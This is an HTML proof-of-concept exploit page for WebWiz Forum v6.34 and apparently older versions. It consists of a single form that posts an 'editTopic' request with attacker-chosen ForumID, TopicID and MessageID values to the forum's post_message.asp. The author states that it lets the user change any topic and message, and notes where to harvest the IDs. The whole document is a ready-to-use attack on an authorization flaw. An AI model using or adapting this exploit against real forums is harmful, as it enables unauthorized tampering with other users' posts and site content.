<html>
<head>
<title>WebWiz Forum v6.34 (maybe older) change any topic and message</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
</head>

<body bgcolor="#FFFFFF" text="#000000">

WebWiz Forum v6.34 (maybe older) change any topic and message (c) pm<br>
(look for all the data at "quote" button refs. ThreadID == MessageID)<br>
<form method="post" name="frmAddMessage" action="http://localhost/forum/post_message.asp?PagePosition=1">
  <table border="0" cellpadding="0" cellspacing="0">
    <tr>
      <td align="right">Subject:</td>
    <td><input type="text" name="subject" size="30" value=""></td>
  </tr>
  <tr>
      <td align="right" valign="top">Message:</td>
    <td><textarea name="message" cols="30" rows="20"></textarea></td>
  </tr>
  <tr>
      <td align="right">Mode:</td>
    <td><input type="text" name="mode" size="30" value="editTopic"></td>
  </tr>
  <tr>
      <td align="right">ForumID:</td>
    <td><input type="text" name="ForumID" size="30" value=""></td>
  </tr>
  <tr>
      <td align="right">TopicID:</td>
    <td><input type="text" name="TopicID" size="30" value=""></td>
  </tr>
  <tr>
      <td align="right">MessageID:</td>
    <td><input type="text" name="MessageID" size="30" value=""></td>
  </tr>
  <tr>
      <td align="right">ThreadPage:</td>
    <td><input type="text" name="ThreadPage" size="30" value="1"></td>
  </tr>
  <tr>
      <td align="right">ThreadPos:</td>
    <td><input type="text" name="ThreadPos" size="30" value="1"></td>
  </tr>
  <tr>
      <td align="right">browser:</td>
    <td><input type="text" name="browser" size="30" value="IE"></td>
  </tr>
  <tr>
    <td></td>
    <td><input type="submit" name="Submit" value="Update Post">
        <input type="reset" name="Reset" value="Clear Form"></td>
  </tr>
</table>
</form>
</body>
</html>
